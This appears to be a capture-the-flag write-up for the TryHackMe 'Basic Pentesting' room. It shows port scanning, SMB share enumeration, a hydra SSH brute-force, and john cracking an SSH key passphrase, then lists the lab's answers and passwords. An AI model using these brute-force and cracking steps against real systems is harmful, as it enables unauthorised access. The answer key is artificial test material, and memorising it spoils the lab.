# Basic Pentesting Try Hack me Room

ip: `10.10.176.8`

server: `Apache/2.4.18 (Ubuntu)`

## nmap scan : 
```bash
	nmap -sC -sV -oN nmap/initial ip
```

## ports open: 
```
	22
	80
	139
	445
	8009
	8080
```

## launching gobuster
```bash
	gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://ip
```

## launching enum4linux ( samba share enumeration ): 
```bash
	enum4linux -a ip | tee enum4linux.log
```

### launching the smbclient :
```bash
smbclient -L \\\\10.10.176.8                                                                                                                  
Enter WORKGROUP\kali's password:                                                                                                                  
                                                                                                                                                  
        Sharename       Type      Comment                                                                                                         
        ---------       ----      -------                                                                                                         
        Anonymous       Disk                                                                                                                      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)                                                                        
SMB1 disabled -- no workgroup available                                          

```

### enumerating the anonymous
```bash
smbclient \\\\\10.10.176.8\\Anonymous -N                              
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018

                14318640 blocks of size 1024. 11089996 blocks available
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit

# local machine..
cat staff.txt 
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay

```

### launching hydra
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://ip
```

### Found id_rsa for kay
```bash 
ssh -i kay.key kay@10.10.176.8
Enter passphrase for key 'kay.key': 
```

### using john the ripper to crack the passphrase
```bash
/usr/share/john/ssh2john.py kay.key > forjohn.txt

```
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay.key)
1g 0:00:00:04 DONE (2021-08-28 05:26) 0.2092g/s 3000Kp/s 3000Kc/s 3000KC/sa6_123..*7Â¡Vamos!
Session completed
```

passphrase : `beeswax`

### Questions and answers.

1. What is the name of the hidden directory on the web server(enter name without /)? 
```
	development (via gobuster)
```

2. What is the username?
```
	jan
```

3. What is the password?
```
	armando ( via hydra )
```

4. What service do you use to access the server(answer in abbreviation in all caps)?
```
	ssh
```

5. What is the name of the other user you found(all lower case)?
```
	kay
```

6. What is the final password you obtain?

```
	heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```